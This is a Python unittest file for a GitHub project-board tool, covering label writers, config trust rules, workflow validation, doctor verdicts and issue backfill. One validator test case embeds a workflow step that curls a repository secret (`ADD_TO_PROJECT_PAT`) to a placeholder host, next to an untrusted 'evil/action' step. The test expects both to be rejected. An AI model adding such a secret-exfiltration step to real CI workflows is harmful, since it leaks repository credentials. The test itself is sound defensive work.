            (["label", "create", "status:in-progress", "--repo", "acme/widget"],
             _ok("")),
            (["issue", "edit", "7", "--repo", "acme/widget",
              "--add-label", "status:in-progress"], _ok("")),
        ])
        result = lb.verb_sub_status(7, "in_progress", self.ctx, runner)
        self.assertEqual((result["sub_status"], result["label"]),
                         ("in_progress", "status:in-progress"))
        # Idempotent label upsert uses --force.
        self.assertIn("--force", runner.calls[1])

    def test_swap_removes_prior_status_label_and_adds_target(self) -> None:
        runner = FakeRunner([
            (["issue", "view", "8", "--repo", "acme/widget", "--json", "labels,state"],
             self._view(["status:in-progress", "bug"])),
            (["label", "create", "status:in-review", "--repo", "acme/widget"], _ok("")),
            (["issue", "edit", "8", "--repo", "acme/widget",
              "--add-label", "status:in-review",
              "--remove-label", "status:in-progress"], _ok("")),
        ])
        result = lb.verb_sub_status(8, "in_review", self.ctx, runner)
        self.assertEqual(result["removed_labels"], ["status:in-progress"])

    def test_resetting_current_status_is_a_noop_edit(self) -> None:
        # Already in_review: ensure the label but make NO issue-edit (nothing to change).
        runner = FakeRunner([
            (["issue", "view", "9", "--repo", "acme/widget", "--json", "labels,state"],
             self._view(["status:in-review"])),
            (["label", "create", "status:in-review", "--repo", "acme/widget"], _ok("")),
        ])
        result = lb.verb_sub_status(9, "in_review", self.ctx, runner)
        self.assertEqual(result["sub_status"], "in_review")
        self.assertFalse(any(c[:2] == ["issue", "edit"] for c in runner.calls))

    def test_done_strips_labels_and_closes_open_issue(self) -> None:
        runner = FakeRunner([
            (["issue", "view", "10", "--repo", "acme/widget", "--json", "labels,state"],
             self._view(["status:in-review"], state="OPEN")),
            (["issue", "edit", "10", "--repo", "acme/widget",
              "--remove-label", "status:in-review"], _ok("")),
            (["issue", "close", "10", "--repo", "acme/widget", "--reason", "completed"], _ok("")),
        ])
        result = lb.verb_sub_status(10, "done", self.ctx, runner)
        self.assertEqual((result["sub_status"], result["closed"]), ("done", True))

    def test_done_on_already_closed_issue_only_reconciles_labels(self) -> None:
        runner = FakeRunner([
            (["issue", "view", "11", "--repo", "acme/widget", "--json", "labels,state"],
             self._view([], state="CLOSED")),
        ])
        result = lb.verb_sub_status(11, "done", self.ctx, runner)
        self.assertEqual((result["closed"], result["removed_labels"]), (False, []))
        self.assertFalse(any(c[:2] == ["issue", "close"] for c in runner.calls))

    def test_missing_issue_is_issue_not_found(self) -> None:
        miss = subprocess.CompletedProcess(args=[], returncode=1, stdout="",
                                           stderr="Could not resolve to an Issue with the number of 99.")
        runner = FakeRunner([
            (["issue", "view", "99", "--repo", "acme/widget", "--json", "labels,state"], miss),
        ])
        with self.assertRaises(lb.BoardError) as caught:
            lb.verb_sub_status(99, "blocked", self.ctx, runner)
        self.assertEqual(caught.exception.code, "issue_not_found")


class ComplexityLabelWriterTest(unittest.TestCase):
    """apply_complexity_label drives the mutually-exclusive `complexity:*` labels
    board-free, mirroring the status:* upsert-then-attach path."""

    def setUp(self) -> None:
        self.ctx = lb.RepoContext(root=".", main_root=".", origin_owner="acme",
                                  origin_repo="widget", default_branch="main")

    @staticmethod
    def _view(labels):
        return _ok(json.dumps({"labels": [{"name": n} for n in labels]}))

    def test_invalid_tier_rejected_before_any_gh_call(self) -> None:
        runner = FakeRunner([])  # any call would raise "unexpected gh call"
        with self.assertRaises(lb.BoardError) as caught:
            lb.apply_complexity_label(7, "epic", self.ctx, runner)
        self.assertEqual(caught.exception.code, "invalid_complexity")
        self.assertEqual(runner.calls, [])

    def test_fresh_issue_ensures_label_and_adds_it(self) -> None:
        runner = FakeRunner([
            (["issue", "view", "7", "--repo", "acme/widget", "--json", "labels"],
             self._view([])),
            (["label", "create", "complexity:medium", "--repo", "acme/widget"], _ok("")),
            (["issue", "edit", "7", "--repo", "acme/widget",
              "--add-label", "complexity:medium"], _ok("")),
        ])
        result = lb.apply_complexity_label(7, "medium", self.ctx, runner)
        self.assertEqual((result["complexity"], result["label"]),
                         ("medium", "complexity:medium"))
        self.assertEqual(result["removed_labels"], [])
        self.assertIn("--force", runner.calls[1])  # idempotent upsert

    def test_swap_removes_prior_complexity_label_and_adds_target(self) -> None:
        runner = FakeRunner([
            (["issue", "view", "8", "--repo", "acme/widget", "--json", "labels"],
             self._view(["complexity:high", "bug"])),
            (["label", "create", "complexity:low", "--repo", "acme/widget"], _ok("")),
            (["issue", "edit", "8", "--repo", "acme/widget",
              "--add-label", "complexity:low",
              "--remove-label", "complexity:high"], _ok("")),
        ])
        result = lb.apply_complexity_label(8, "low", self.ctx, runner)
        self.assertEqual(result["removed_labels"], ["complexity:high"])

    def test_reapplying_current_tier_is_a_noop_edit(self) -> None:
        runner = FakeRunner([
            (["issue", "view", "9", "--repo", "acme/widget", "--json", "labels"],
             self._view(["complexity:medium"])),
            (["label", "create", "complexity:medium", "--repo", "acme/widget"], _ok("")),
        ])
        result = lb.apply_complexity_label(9, "medium", self.ctx, runner)
        self.assertEqual(result["complexity"], "medium")
        self.assertFalse(any(c[:2] == ["issue", "edit"] for c in runner.calls))

    def test_missing_issue_is_issue_not_found(self) -> None:
        miss = subprocess.CompletedProcess(args=[], returncode=1, stdout="",
                                           stderr="Could not resolve to an Issue with the number of 99.")
        runner = FakeRunner([
            (["issue", "view", "99", "--repo", "acme/widget", "--json", "labels"], miss),
        ])
        with self.assertRaises(lb.BoardError) as caught:
            lb.apply_complexity_label(99, "high", self.ctx, runner)
        self.assertEqual(caught.exception.code, "issue_not_found")


class ConfigTest(unittest.TestCase):
    def test_parse_origin_forms(self) -> None:
        self.assertEqual(lb.parse_origin("git@github.com:a/b.git"), ("a", "b"))
        self.assertEqual(lb.parse_origin("https://github.com/a/b"), ("a", "b"))
        self.assertEqual(lb.parse_origin("https://github.com/a/b.git"), ("a", "b"))

    def test_owner_mismatch_is_hard_error(self) -> None:
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "agentic-engineering.md").write_text(
                "---\ngithub_project_owner: attacker\ngithub_project_number: 9\n---\n",
                encoding="utf-8")
            ctx = lb.RepoContext(root=tmp, main_root=tmp, origin_owner="victim",
                                 origin_repo="r", default_branch="main")
            with self.assertRaises(lb.BoardError) as caught:
                lb.read_board_config(ctx)
            self.assertEqual(caught.exception.code, "owner_mismatch")

    def test_trusted_foreign_owner_via_git_config_is_accepted(self) -> None:
        # The trust store lives out-of-band in .git/config — unreachable by any
        # PR. An in-file allowlist is intentionally NOT read (self-referential).
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            subprocess.run(["git", "-C", tmp, "init", "-q"], check=True,
                           capture_output=True, text=True)
            subprocess.run(["git", "-C", tmp, "config",
                            "agentic.trustedBoardOwners", "canonical"],
                           check=True, capture_output=True, text=True)
            (Path(tmp) / "agentic-engineering.md").write_text(
                "---\ngithub_project_owner: canonical\ngithub_project_number: 9\n---\n",
                encoding="utf-8")
            ctx = lb.RepoContext(root=tmp, main_root=tmp, origin_owner="fork-owner",
                                 origin_repo="r", default_branch="main")
            board = lb.read_board_config(ctx)
            self.assertEqual((board.owner, board.number), ("canonical", 9))

    def test_in_file_allowlist_is_not_trusted(self) -> None:
        # An attacker PR that sets owner AND a self-referential allowlist must
        # still be rejected — the allowlist key is no longer honored.
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "agentic-engineering.md").write_text(
                "---\ngithub_project_owner: attacker\ngithub_project_number: 9\n"
                "github_project_owner_allowlist: attacker\n---\n",
                encoding="utf-8")
            ctx = lb.RepoContext(root=tmp, main_root=tmp, origin_owner="victim",
                                 origin_repo="r", default_branch="main")
            with self.assertRaises(lb.BoardError) as caught:
                lb.read_board_config(ctx)
            self.assertEqual(caught.exception.code, "owner_mismatch")

    def test_tracked_local_config_is_ignored(self) -> None:
        # A .local.md committed to git (would ride a PR) must be ignored; the
        # committed config is used instead.
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            subprocess.run(["git", "-C", tmp, "init", "-q"], check=True,
                           capture_output=True, text=True)
            (Path(tmp) / "agentic-engineering.local.md").write_text(
                "---\ngithub_project_owner: attacker\ngithub_project_number: 1\n---\n",
                encoding="utf-8")
            (Path(tmp) / "agentic-engineering.md").write_text(
                "---\ngithub_project_owner: victim\ngithub_project_number: 9\n---\n",
                encoding="utf-8")
            subprocess.run(["git", "-C", tmp, "add", "agentic-engineering.local.md"],
                           check=True, capture_output=True, text=True)
            ctx = lb.RepoContext(root=tmp, main_root=tmp, origin_owner="victim",
                                 origin_repo="r", default_branch="main")
            board = lb.read_board_config(ctx)
            # Fell through to committed config (owner==origin), not the tracked local.
            self.assertEqual((board.owner, board.number, board.source), ("victim", 9, "committed"))

    def test_parse_origin_rejects_repo_less_url(self) -> None:
        # host must never be captured as the owner (verified bug).
        self.assertEqual(lb.parse_origin("https://github.com/justowner"), ("", ""))


class RetryTimeoutTest(unittest.TestCase):
    def test_retry_on_secondary_limit_then_success(self) -> None:
        import unittest.mock as mock
        responses = [
            subprocess.CompletedProcess([], 1, "", "HTTP 403 secondary rate limit"),
            _ok("{}"),
        ]

        def runner(args, timeout=None):
            return responses.pop(0)

        with mock.patch.object(lb.time, "sleep") as slept:
            result = lb._run_gh_retry(runner, ["api", "user"])
        self.assertEqual(result.returncode, 0)
        self.assertEqual(responses, [])   # both consumed → exactly 2 calls
        slept.assert_called_once()

    def test_run_gh_raises_board_error_on_timeout(self) -> None:
        import unittest.mock as mock
        with mock.patch.object(lb.shutil, "which", return_value="/usr/bin/gh"), \
                mock.patch.object(lb.subprocess, "run",
                                  side_effect=subprocess.TimeoutExpired(cmd="gh", timeout=1)):
            with self.assertRaises(lb.BoardError) as caught:
                lb.run_gh(["api", "user"])
        self.assertEqual(caught.exception.code, "gh_timeout")


def _issue_item(number, repo="acme/widget", type_="Issue"):
    return {"content": {"type": type_, "number": number, "repository": repo,
                        "title": f"i{number}"}}


def _parents_batch(numbers, parents=None, null_for=()):
    """A `_batched_parent_numbers` GraphQL reply for `numbers`. `parents` maps a
    number to its parent number (a sub-issue); numbers in `null_for` come back as
    a null alias (an unreadable node the caller must fail toward not-adding);
    every other number is parentless."""
    parents = parents or {}
    null_for = set(null_for)
    nodes = {}
    for n in numbers:
        if n in null_for:
            nodes[f"i{n}"] = None
            continue
        p = parents.get(n)
        nodes[f"i{n}"] = {"parent": {"number": p} if p is not None else None}
    return json.dumps({"data": {"repository": nodes}})


class ConfigKeysWriteTest(unittest.TestCase):
    """write_config_keys / upsert_frontmatter_keys: the single committed-config
    write path (moved from bootstrap). Byte-preservation + atomicity."""

    def _tmp(self):
        import tempfile
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        return d.name

    def test_creates_file_with_all_keys_in_one_write(self) -> None:
        root = self._tmp()
        path = lb.write_config_keys(root, {
            "github_project_owner": "acme", "github_project_number": "5",
            lb.CONFIG_KEY_FORWARD_BINDING: "workflow-only"})
        meta = lb.parse_frontmatter(Path(path).read_text(encoding="utf-8"))
        self.assertEqual(meta["github_project_owner"], "acme")
        self.assertEqual(meta["github_project_number"], "5")
        self.assertEqual(meta[lb.CONFIG_KEY_FORWARD_BINDING], "workflow-only")

    def test_upsert_preserves_body_and_unrelated_keys(self) -> None:
        text = ("---\ntitle: Cfg\ngithub_project_owner: old\n"
                "github_project_number: 1\nkeep: me\n---\n\n# Notes\n\nbody\n")
        out = lb.upsert_frontmatter_keys(text, {
            "github_project_owner": "acme", lb.CONFIG_KEY_BACKFILLED_THROUGH: "42"})
        meta = lb.parse_frontmatter(out)
        self.assertEqual(meta["github_project_owner"], "acme")
        self.assertEqual(meta["github_project_number"], "1")  # untouched
        self.assertEqual(meta["keep"], "me")
        self.assertEqual(meta[lb.CONFIG_KEY_BACKFILLED_THROUGH], "42")
        self.assertIn("# Notes", out)
        self.assertIn("body", out)

    def test_updates_every_occurrence_of_a_duplicate_key(self) -> None:
        # parse_frontmatter is last-wins: a duplicate key left un-updated would
        # make the write a silent no-op. Both occurrences must become the new value.
        text = ("---\ngithub_project_owner: old\ngithub_project_number: 1\n"
                "github_project_owner: older\n---\nbody\n")
        out = lb.upsert_frontmatter_keys(text, {"github_project_owner": "new"})
        self.assertEqual(lb.parse_frontmatter(out)["github_project_owner"], "new")
        self.assertNotIn("older", out)

    def test_crlf_file_keeps_crlf_on_rewritten_lines(self) -> None:
        # Byte-preservation: a rewritten line must not flip \r\n to bare \n.
        text = "---\r\ngithub_project_owner: old\r\ngithub_project_number: 1\r\n---\r\nbody\r\n"
        out = lb.upsert_frontmatter_keys(text, {"github_project_owner": "new"})
        self.assertIn("github_project_owner: new\r\n", out)
        self.assertNotIn("github_project_owner: new\n", out.replace("\r\n", "\r\r"))  # no bare LF
        self.assertEqual(lb.parse_frontmatter(out)["github_project_owner"], "new")
        self.assertIn("body", out)

    def test_marker_write_only_touches_its_key(self) -> None:
        # A backfill marker write must not disturb identity or forward binding.
        root = self._tmp()
        lb.write_config_keys(root, {"github_project_owner": "acme",
                                    "github_project_number": "5",
                                    lb.CONFIG_KEY_FORWARD_BINDING: "auto-add"})
        lb.write_config_keys(root, {lb.CONFIG_KEY_BACKFILLED_THROUGH: "99"})
        meta = lb.parse_frontmatter(
            (Path(root) / lb.COMMITTED_CONFIG).read_text(encoding="utf-8"))
        self.assertEqual(meta["github_project_owner"], "acme")
        self.assertEqual(meta[lb.CONFIG_KEY_FORWARD_BINDING], "auto-add")
        self.assertEqual(meta[lb.CONFIG_KEY_BACKFILLED_THROUGH], "99")


class BindingConfigTest(unittest.TestCase):
    """read_binding_config: enum validation, backfill marker, unset degrade."""

    def _ctx_with(self, body):
        import tempfile
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        (Path(d.name) / lb.COMMITTED_CONFIG).write_text(body, encoding="utf-8")
        return lb.RepoContext(root=d.name, main_root=d.name, origin_owner="acme",
                              origin_repo="widget", default_branch="main")

    def test_reads_valid_forward_binding_and_marker(self) -> None:
        ctx = self._ctx_with(
            "---\ngithub_project_owner: acme\ngithub_project_number: 5\n"
            "github_project_forward_binding: auto-add\n"
            "github_project_backfilled_through: 42\n---\n")
        b = lb.read_binding_config(ctx)
        self.assertEqual(b.forward_binding, "auto-add")
        self.assertEqual(b.backfilled_through, 42)
        self.assertEqual(b.source, "committed")

    def test_unrecognized_forward_binding_degrades_to_none_but_keeps_raw(self) -> None:
        ctx = self._ctx_with(
            "---\ngithub_project_owner: acme\ngithub_project_number: 5\n"
            "github_project_forward_binding: bogus\n---\n")
        b = lb.read_binding_config(ctx)
        self.assertIsNone(b.forward_binding)   # not a valid enum
        self.assertEqual(b.forward_raw, "bogus")  # preserved for the doctor WARN

    def test_unset_when_only_identity_present(self) -> None:
        ctx = self._ctx_with(
            "---\ngithub_project_owner: acme\ngithub_project_number: 5\n---\n")
        b = lb.read_binding_config(ctx)
        self.assertIsNone(b.forward_binding)
        self.assertEqual(b.forward_raw, "")
        self.assertIsNone(b.backfilled_through)

    def test_local_override_of_one_key_does_not_mask_the_other(self) -> None:
        # Orthogonal keys resolve independently: a .local that sets only the
        # forward binding must NOT hide the committed backfill marker (a single
        # first-hit-wins scan would, breaking verb_backfill's `prior` read).
        import tempfile
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        root = d.name
        (Path(root) / lb.COMMITTED_CONFIG).write_text(
            "---\ngithub_project_owner: acme\ngithub_project_number: 5\n"
            "github_project_backfilled_through: 40\n---\n", encoding="utf-8")
        (Path(root) / lb.LOCAL_CONFIG).write_text(
            "---\ngithub_project_forward_binding: auto-add\n---\n", encoding="utf-8")
        ctx = lb.RepoContext(root=root, main_root=root, origin_owner="acme",
                             origin_repo="widget", default_branch="main")
        b = lb.read_binding_config(ctx)
        self.assertEqual(b.forward_binding, "auto-add")   # from .local
        self.assertEqual(b.backfilled_through, 40)         # still seen from committed


class AutoAddWorkflowTest(unittest.TestCase):
    def _ctx(self):
        import tempfile
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        return lb.RepoContext(root=d.name, main_root=d.name, origin_owner="acme",
                              origin_repo="widget", default_branch="main"), Path(d.name)

    def test_finds_add_to_project_workflow(self) -> None:
        ctx, root = self._ctx()
        wf = root / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "add-to-project.yml").write_text(
            "on: issues\njobs:\n  a:\n    steps:\n      - uses: actions/add-to-project@v2\n",
            encoding="utf-8")
        self.assertEqual(lb.find_auto_add_workflow(ctx), ".github/workflows/add-to-project.yml")

    def test_none_when_no_workflows_dir(self) -> None:
        ctx, _ = self._ctx()
        self.assertIsNone(lb.find_auto_add_workflow(ctx))

    def test_none_when_workflow_unrelated(self) -> None:
        ctx, root = self._ctx()
        wf = root / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text("on: push\njobs: {}\n", encoding="utf-8")
        self.assertIsNone(lb.find_auto_add_workflow(ctx))

    def _write(self, text):
        ctx, root = self._ctx()
        wf = root / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "add.yml").write_text(text, encoding="utf-8")
        return ctx

    def test_structurally_validates_generated_workflow(self) -> None:
        url = "https://github.com/orgs/acme/projects/5"
        ctx = self._write(
            "on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
            "      - uses: actions/add-to-project@" + "a" * 40 + "\n"
            "        with:\n          project-url: " + url + "\n"
            "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n")
        inspection = lb.inspect_auto_add_workflow(ctx, url)
        self.assertTrue(inspection.valid, inspection.detail)

    def test_rejects_wrong_trigger_moving_ref_url_and_secret(self) -> None:
        expected = "https://github.com/orgs/acme/projects/5"
        ctx = self._write(
            "on:\n  issues:\n    types: [reopened]\njobs:\n  add:\n    steps:\n"
            "      - uses: actions/add-to-project@v2\n        with:\n"
            "          project-url: https://github.com/users/acme/projects/5\n"
            "          github-token: ${{ secrets.WRONG }}\n")
        inspection = lb.inspect_auto_add_workflow(ctx, expected)
        self.assertFalse(inspection.valid)
        for fragment in ("issues/opened", "40-character", "project-url", "ADD_TO_PROJECT_PAT"):
            self.assertIn(fragment, inspection.detail)

    def test_comments_do_not_count_as_workflow(self) -> None:
        ctx = self._write("# uses: actions/add-to-project@" + "a" * 40 + "\n")
        self.assertIsNone(lb.find_auto_add_workflow(ctx))

    def test_rejects_split_duplicate_or_scripted_credential_use(self) -> None:
        url = "https://github.com/orgs/acme/projects/5"
        sha = "a" * 40
        cases = {
            "split_steps": (
                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
                f"      - uses: actions/add-to-project@{sha}\n"
                f"      - name: misplaced inputs\n        with:\n          project-url: {url}\n"
                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"),
            "wrong_input_parent": (
                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
                f"      - uses: actions/add-to-project@{sha}\n        env:\n"
                f"          project-url: {url}\n"
                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"),
            "duplicate_action": (
                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
                f"      - uses: actions/add-to-project@{sha}\n        with:\n"
                f"          project-url: {url}\n"
                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"
                f"      - uses: actions/add-to-project@{sha}\n"),
            "extra_secret_run": (
                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
                f"      - uses: actions/add-to-project@{sha}\n        with:\n"
                f"          project-url: {url}\n"
                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"
                "      - run: curl -d '${{ secrets.ADD_TO_PROJECT_PAT }}' example.invalid\n"),
            "extra_other_action": (
                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
                f"      - uses: evil/action@{'b' * 40}\n"
                f"      - uses: actions/add-to-project@{sha}\n        with:\n"
                f"          project-url: {url}\n"
                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"),
            "extra_trigger": (
                f"on:\n  issues:\n    types: [opened]\n  push:\n    branches: [main]\n"
                f"jobs:\n  add:\n    steps:\n      - uses: actions/add-to-project@{sha}\n"
                f"        with:\n          project-url: {url}\n"
                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"),
            "duplicate_issue_trigger": (
                f"on:\n  issues:\n    types: [opened]\n  issues:\n    types: [opened]\n"
                f"jobs:\n  add:\n    steps:\n      - uses: actions/add-to-project@{sha}\n"
                f"        with:\n          project-url: {url}\n"
                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"),
        }
        for name, text in cases.items():
            with self.subTest(case=name):
                inspection = lb.inspect_auto_add_workflow(self._write(text), url)
                self.assertFalse(inspection.valid, inspection.detail)


class ForwardBindingCheckTest(unittest.TestCase):
    """The pure per-branch doctor verdict (evaluate_forward_binding_check)."""

    def _binding(self, forward=None, raw="", through=None):
        return lb.BindingConfig(forward_binding=forward, forward_raw=raw,
                                backfilled_through=through, source="committed")

    @staticmethod
    def _inspection(path=None, valid=False, detail="missing", fix="fix it"):
        return lb.AutoAddWorkflowInspection(path, valid, detail, fix)

    def test_unset_warns(self) -> None:
        status, _detail, fix = lb.evaluate_forward_binding_check(
            self._binding(), self._inspection())
        self.assertEqual(status, "FAIL")
        self.assertIn(lb.CONFIG_KEY_FORWARD_BINDING, fix)

    def test_unrecognized_value_warns(self) -> None:
        status, detail, _fix = lb.evaluate_forward_binding_check(
            self._binding(forward=None, raw="bogus"), self._inspection())
        self.assertEqual(status, "FAIL")
        self.assertIn("bogus", detail)

    def test_workflow_only_passes_without_orphan(self) -> None:
        status, _d, _f = lb.evaluate_forward_binding_check(
            self._binding(forward="workflow-only"), self._inspection())
        self.assertEqual(status, "PASS")

    def test_workflow_only_fails_on_orphaned_auto_add_file(self) -> None:
        status, detail, _f = lb.evaluate_forward_binding_check(
            self._binding(forward="workflow-only"),
            self._inspection(".github/workflows/add-to-project.yml"))
        self.assertEqual(status, "FAIL")
        self.assertIn("add-to-project.yml", detail)

    def test_auto_add_fails_when_file_missing(self) -> None:
        status, _d, fix = lb.evaluate_forward_binding_check(
            self._binding(forward="auto-add"), self._inspection())
        self.assertEqual(status, "FAIL")
        self.assertIn("workflow-only", fix)

    def test_auto_add_passes_with_file_and_flags_secret_unverifiable(self) -> None:
        status, detail, _f = lb.evaluate_forward_binding_check(
            self._binding(forward="auto-add"),
            self._inspection(".github/workflows/add-to-project.yml", True, "validated", ""))
        self.assertEqual(status, "PASS")
        self.assertIn("secret", detail.lower())  # the write-only-secret caveat is explicit

    def test_none_passes(self) -> None:
        status, _d, _f = lb.evaluate_forward_binding_check(
            self._binding(forward="none"), self._inspection())
        self.assertEqual(status, "PASS")


class DoctorVerdictTest(unittest.TestCase):
    """Exercise the final verb_doctor verdict, not only individual helpers."""

    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.ctx = lb.RepoContext(root=self.tmp.name, main_root=self.tmp.name,
                                  origin_owner="acme", origin_repo="widget",
                                  default_branch="main")
        self.board = lb.BoardConfig("acme", 5, "committed")
        self.schema = lb.BoardSchema("PVT_1", "F_STATUS",
                                     {stage: f"O_{stage}" for stage in lb.STAGES}, "F_PRIORITY")

    @staticmethod
    def _runner(*, auth="github.com scopes: repo, project", issues=_ok("true\n")):
        def run(args, timeout=None):
            if args == ["auth", "status"]:
                return _ok(auth)
            if args[:2] == ["api", "repos/acme/widget"]:
                return issues
            if args[:2] == ["pr", "list"]:
                return _ok("[]")
            raise AssertionError(f"unexpected gh call: {args}")
        return run

    def _doctor(self, *, board=None, access=None, workflows=None, schema=..., linked=...,
                auth="github.com scopes: repo, project", issues=_ok("true\n")):
        board = self.board if board is ... else board
        access = lb.ProjectAccess("Organization", "PVT_1", True) if access is ... else access
        workflows = {"Item closed": True} if workflows is ... else workflows
        schema = self.schema if schema is ... else schema
        linked = [self.ctx.slug] if linked is ... else linked
        with mock.patch.object(lb.shutil, "which", return_value="/usr/bin/gh"), \
             mock.patch.object(lb, "_gh_version", return_value=(2, 94, 0)), \
             mock.patch.object(lb, "read_board_config", return_value=board), \
             mock.patch.object(lb, "project_access", return_value=access), \
             mock.patch.object(lb, "resolve_schema", return_value=schema), \
             mock.patch.object(lb, "project_workflows", return_value=workflows), \
             mock.patch.object(lb, "project_linked_repos", return_value=linked), \
             mock.patch.object(lb, "read_binding_config", return_value=lb.BindingConfig(
                 "workflow-only", "workflow-only", None, "committed")), \
             mock.patch.object(lb, "inspect_auto_add_workflow", return_value=
                               lb.AutoAddWorkflowInspection(None, False, "missing", "fix")):
            return lb.verb_doctor(self.ctx, self._runner(auth=auth, issues=issues))

    def test_ready_for_personal_and_organization_project_shapes(self) -> None:
        for owner_type in ("User", "Organization"):
            with self.subTest(owner_type=owner_type):
                result = self._doctor(board=..., access=lb.ProjectAccess(
                    owner_type, "PVT_1", True), workflows=...)
                self.assertTrue(result["ready"])

    def test_critical_unknown_or_missing_cases_fail_final_verdict(self) -> None:
        fail = subprocess.CompletedProcess(args=[], returncode=1, stdout="", stderr="denied")
        cases = {
            "board_missing": {"board": None, "access": None, "workflows": None},
            "project_scope_missing": {"board": ..., "access": ..., "workflows": ...,
                                      "auth": "github.com scopes: repo, read:project"},
            "issues_unreadable": {"board": ..., "access": ..., "workflows": ...,
                                  "issues": fail},
            "write_access_unknown": {"board": ..., "access": None, "workflows": ...},
            "write_access_denied": {"board": ..., "access": lb.ProjectAccess(
                "Organization", "PVT_1", False), "workflows": ...},
            "closed_workflow_unknown": {"board": ..., "access": ..., "workflows": None},
            "closed_workflow_disabled": {"board": ..., "access": ...,
                                         "workflows": {"Item closed": False}},
            "priority_missing": {"board": ..., "access": ..., "workflows": ...,
                                 "schema": lb.BoardSchema("PVT_1", "F_STATUS", {
                                     stage: f"O_{stage}" for stage in lb.STAGES}, None)},
            "repo_link_unknown": {"board": ..., "access": ..., "workflows": ...,
                                  "linked": None},
            "repo_not_linked": {"board": ..., "access": ..., "workflows": ...,
                                "linked": []},
        }
        for name, kwargs in cases.items():
            with self.subTest(case=name):
                self.assertFalse(self._doctor(**kwargs)["ready"])


class BackfillVerbTest(unittest.TestCase):
    """verb_backfill: idempotent add of open issues not on the board, with a
    contiguous, resumable high-water mark. The 50-cap bug guard lives here."""

    def setUp(self) -> None:
        import tempfile
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        root = self._tmp.name
        (Path(root) / lb.COMMITTED_CONFIG).write_text(
            "---\ngithub_project_owner: acme\ngithub_project_number: 1\n---\n",
            encoding="utf-8")
        self.ctx = lb.RepoContext(root=root, main_root=root, origin_owner="acme",
                                  origin_repo="widget", default_branch="main")

    def _marker(self):
        return lb.read_binding_config(self.ctx).backfilled_through

    def test_adds_missing_skips_present_and_records_marker(self) -> None:
        board_items = {"items": [_issue_item(1), _issue_item(2)]}
        repo_issues = [{"number": n, "url": f"https://github.com/acme/widget/issues/{n}"}
                       for n in (1, 2, 3, 4)]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps(board_items))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
            (["api", "graphql"], _ok(_parents_batch([3, 4]))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i3"}))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i4"}))),
        ])
        result = lb.verb_backfill(self.ctx, runner)
        self.assertEqual(result["added"], [3, 4])
        self.assertEqual(sorted(result["already_present"]), [1, 2])
        self.assertEqual(result["counts"], {"added": 2, "already_present": 2,
                                            "skipped_sub_issues": 0, "failed": 0})
        self.assertEqual(result["high_water"], 4)
        self.assertTrue(result["marker_written"])
        self.assertEqual(self._marker(), 4)  # round-trips through the reader

    def test_excludes_prs_and_foreign_items_from_membership(self) -> None:
        # A PR-typed and a foreign-repo board item must NOT count as present, so
        # the matching repo issue (if any) is still (re-)added harmlessly.
        board_items = {"items": [
            _issue_item(1),
            _issue_item(2, type_="PullRequest"),      # dropped
            _issue_item(3, repo="other/repo"),         # foreign, dropped
        ]}
        repo_issues = [{"number": 1, "url": "u1"}, {"number": 5, "url": "u5"}]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps(board_items))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
            (["api", "graphql"], _ok(_parents_batch([5]))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i5"}))),
        ])
        result = lb.verb_backfill(self.ctx, runner)
        self.assertEqual(result["already_present"], [1])
        self.assertEqual(result["added"], [5])

    def test_enumerates_past_fifty_no_silent_cap(self) -> None:
        # The latent bug this whole change guards against: a backfill built on
        # _item_list (cap 50) would silently drop issues 51+. 55 open issues,
        # empty board → all 55 added.
        n = 55
        repo_issues = [{"number": i, "url": f"u{i}"} for i in range(1, n + 1)]
        responses = [
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps({"items": []}))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
            (["api", "graphql"], _ok(_parents_batch(list(range(1, n + 1))))),
        ]
        responses += [(["project", "item-add", "1", "--owner", "acme"],
                       _ok(json.dumps({"id": f"i{i}"}))) for i in range(1, n + 1)]
        runner = FakeRunner(responses)
        result = lb.verb_backfill(self.ctx, runner)
        self.assertEqual(result["counts"]["added"], n)
        self.assertEqual(result["high_water"], n)
        # And the enumeration used a >50 limit, not READY_WORK_LIMIT.
        list_call = next(c for c in runner.calls if c[:1] == ["issue"])
        self.assertIn(str(lb.BACKFILL_ISSUE_LIMIT), list_call)
